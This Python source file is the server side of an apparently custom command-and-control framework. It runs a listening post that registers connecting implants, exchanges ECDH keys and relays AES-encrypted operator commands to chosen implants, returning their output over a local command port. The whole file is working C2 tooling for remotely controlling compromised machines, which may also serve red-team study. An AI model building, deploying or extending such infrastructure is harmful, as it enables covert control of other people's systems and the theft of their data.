#!/bin/python3
import socket
import argparse
import ipaddress
from rich.console import Console
import threading
import time
import json
import src.crypto.ecdh as ecdh

parser = argparse.ArgumentParser()
parser.add_argument("--ip", required=True, help="The IP address for the server to listen on")
parser.add_argument("--port", required=True, help="The Port for the server to listen on")
args = parser.parse_args()

class MyServer():
    #Get the host and port upon object creation
    def __init__(self, HOST, PORT):
        self.LPHOST = str(HOST)
        self.LPPORT = int(PORT)
        self.CMDHOST = '127.0.0.1'
        self.CMDPORT = 10000
        self.console = Console()
        self.sockets = {
        "lp_sock" : socket.socket(),
        "command_sock" : socket.socket()
        }
        self.lp_connections = {}
        self.client_sockets = []
        self.cmd_connections = []

    def negotiate_secret(self, conn):
        key_gen = ecdh.key()
        client_half = conn.recv(1024)
        conn.send(str(key_gen.half_key).encode())
        full_key = key_gen.gen_full(int(client_half.decode()))
        return full_key
    
    def encrypt_msg(self, msg, full_key):
        aes = ecdh.C2_AES(full_key)
        return aes.encrypt(msg)

    def decrypt_msg(self, encrypted_msg, full_key):
        aes = ecdh.C2_AES(full_key)
        return aes.decrypt(encrypted_msg)
    #function for handling Connections
    def lp_handle_connection(self, connection):
        implant_info = connection[0].recv(1024)
        implant_info = json.loads(implant_info.decode())
        self.lp_connections[f"{len(self.lp_connections)}"] = {
        "connection" : connection[1],
        "info" : implant_info
        }
        key_gen = ecdh.key()
        connection[0].send(str(key_gen.half_key).encode())
        aes_secret = key_gen.gen_full(int(implant_info['number']))
        self.client_sockets.append((connection[0], aes_secret))

    def command_handle_connection(self, connection):
        self.cmd_connections.append(connection)
        aes_key = self.negotiate_secret(connection[0])
        while True:
            data_len = connection[0].recv(8).decode()
            data = connection[0].recv(int(data_len))
            data = self.decrypt_msg(data, aes_key)
            if data.decode() == "get_clients":
                msg = self.encrypt_msg(json.dumps(self.lp_connections), aes_key)
                connection[0].send(str(len(msg)).encode())
                connection[0].send(msg)
            else:
                data = json.loads(data.decode())
                if 'command' in data:
                    msg = self.encrypt_msg(data["command"],self.client_sockets[int(data['client_id'])][1])
                    self.client_sockets[int(data['client_id'])][0].send(str(len(msg)).encode())
                    self.client_sockets[int(data['client_id'])][0].send(msg)
                    response_len = self.client_sockets[int(data['client_id'])][0].recv(8)
                    response = self.client_sockets[int(data['client_id'])][0].recv(int(response_len.decode()))
                    response = self.decrypt_msg(response, self.client_sockets[int(data['client_id'])][1])
                    msg = self.encrypt_msg(response.decode(), aes_key)
                    connection[0].send(str(len(msg)).encode())
                    connection[0].send(msg)
    #function to bind socket to port
    def bind(self, sock, host, port):
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            sock.bind((host, port))
            return True
        except:
            self.console.log(f"Unable to bind to {host}:{port}")
            self.console.log("Exiting...")
            return False
    #function to start listening
    def lp_listen(self, sock):
        try:
            sock.listen(10)
        except:
            self.console.log(f"Unable to start listening on {self.LPHOST}:{self.LPPORT}")
            self.console.log("Exiting...")
            return
        self.console.log(f"Successfully started listening post on {self.LPHOST}:{self.LPPORT}")
        while True:
            conn, addr = sock.accept()
            self.console.log(f"Connection to LP from {addr[0]}:{addr[1]}")
            thread = threading.Thread(target=self.lp_handle_connection, args=[(conn, addr)])
            thread.deamon = True
            thread.start()
    def command_listen(self, sock):
        try:
            sock.listen(10)
        except:
            self.console.log(f"Unable to start listening on {self.CMDHOST}:{self.CMDPORT}")
            self.console.log("Exiting...")
            return
        self.console.log(f"Successfully started Command Port on {self.CMDHOST}:{self.CMDPORT}")
        self.console.log("Waiting for connections...")
        while True:
            conn, addr = sock.accept()
            self.console.log(f"Connection to Command Port from {addr[0]}:{addr[1]}")
            thread = threading.Thread(target=self.command_handle_connection, args=[(conn, addr)])
            thread.deamon = True
            thread.start()
    #function to start the server
    def start(self):
        #start LP
        bind_status = self.bind(self.sockets['lp_sock'], self.LPHOST, self.LPPORT)
        if bind_status == True:
            lp_sock_thread = threading.Thread(target=self.lp_listen, args=[self.sockets['lp_sock']])
            lp_sock_thread.start()
        bind_status = self.bind(self.sockets['command_sock'], self.CMDHOST, self.CMDPORT)
        if bind_status == True:
            command_sock_thread = threading.Thread(target=self.command_listen, args=[self.sockets['command_sock']])
            command_sock_thread.start()

#our main function that calls everything
def main(args):
    console = Console()
    #Check to make sure we have a valid ip
    try:
        ipaddress.ip_address(args.ip)
    except:
        console.log("Invalid IP Address")
        console.log("Exiting...")
        return
    #create server and start it
    server = MyServer(args.ip, args.port)
    server.start()

if __name__ == "__main__":
    main(args)
